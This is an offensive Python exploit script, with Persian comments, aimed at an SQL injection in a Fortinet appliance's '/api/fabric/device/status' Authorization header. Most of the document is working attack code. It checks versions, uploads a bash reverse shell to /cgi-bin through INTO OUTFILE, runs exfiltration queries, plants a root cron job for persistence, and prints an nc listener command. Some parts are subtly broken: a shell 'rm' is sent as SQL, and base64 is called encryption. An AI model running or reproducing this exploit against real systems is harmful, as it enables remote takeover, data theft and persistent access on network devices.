#!/usr/bin/env python3
import requests, argparse, binascii, os
from urllib.parse import urljoin
from base64 import b64encode

# دامنه نسخه‌های آسیب‌پذیر طبق advisories رسمی (FortiGuard, InfoSecBulletin)
AFFECTED = {"7.6":range(0,4),"7.4":range(0,8),"7.2":range(0,11),"7.0":range(0,11)}

def detect(host, https):
    proto = "https://" if https else "http://"
    res = requests.get(f"{proto}{host}/api/fabric/device/status",
                       headers={"Authorization":"Bearer AAAAAA'or'1'='1"},
                       verify=False, timeout=8)
    if res.status_code == 200:
        v = res.json().get("version",{})
        ver = f"{v['major']}.{v['minor']}"
        p = int(v['patch'])
        if p in AFFECTED.get(ver, []):
            print(f"[+] Vulnerable → {ver}.{p}")
            return True, proto + host
    return False, None

def inject(host, sql):
    h={"Authorization":f"Bearer ';{sql};--"}
    return requests.get(host+"/api/fabric/device/status",
                        headers=h, verify=False)

def upload_rev_shell(host, lhost, lport):
    shell = f"#!/bin/sh\nbash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    parts = [shell[i:i+16] for i in range(0, len(shell), 16)]
    inject(host, "drop table if exists a")
    inject(host, "create table a(a TEXT)")
    for p in parts:
        h=binascii.hexlify(p.encode()).decode()
        inject(host, f"use fabric_user;update a set a=concat(a,0x{h})")
    inject(host, f"select a from a into outfile '/cgi-bin/shell.sh'")
    inject(host, "drop table a")
    print("[*] Reverse shell uploaded as /cgi-bin/shell.sh")

def exfil_data(host, query):
    enc = b64encode(query.encode()).decode()
    inject(host, f"' UNION SELECT CAST(FROM_BASE64('{enc}') AS CHAR) INTO OUTFILE '/tmp/exfil.txt'--")
    print("[*] Encrypted exfiltration started → /tmp/exfil.txt")

def setup_persistence(host):
    inject(host, "drop table if exists p")
    inject(host, "create table p(b TEXT)")
    payload = "*/5 * * * * root /cgi-bin/shell.sh"
    h=binascii.hexlify(payload.encode()).decode()
    inject(host, f"use fabric_user;update p set b=concat('',0x{h})")
    inject(host, "select b from p into outfile '/etc/cron.d/sys'")  # deploy cron
    inject(host, "drop table p")
    print("[*] Persistence cron created to run shell every 5 min")

def cleanup(host):
    inject(host, "select '' into outfile '/cgi-bin/shell.sh'")
    inject(host, "rm /etc/cron.d/sys")  # پاک‌سازی cron persistence
    print("[*] Cleaned shell and persistence")

if __name__=="__main__":
    p=argparse.ArgumentParser()
    p.add_argument("host"); p.add_argument("--https",action="store_true")
    p.add_argument("--lhost",required=True); p.add_argument("--lport",required=True)
    p.add_argument("--exfil",help="SQL query to exfiltrate")
    p.add_argument("--persist", action="store_true", help="Enable cron persistence")
    args = p.parse_args()

    ok, url = detect(args.host, args.https)
    if not ok:
        print("[-] Target not vulnerable"); exit(1)

    upload_rev_shell(url, args.lhost, args.lport)
    print(f"[*] Start listener: nc -lnvp {args.lport}")

    if args.exfil:
        exfil_data(url, args.exfil)
    if args.persist:
        setup_persistence(url)

    input("[+] After tasks complete, press ENTER to clean everything")
    cleanup(url)
    print("[✔] Completed: shell, exfil, persistence cleanup.")
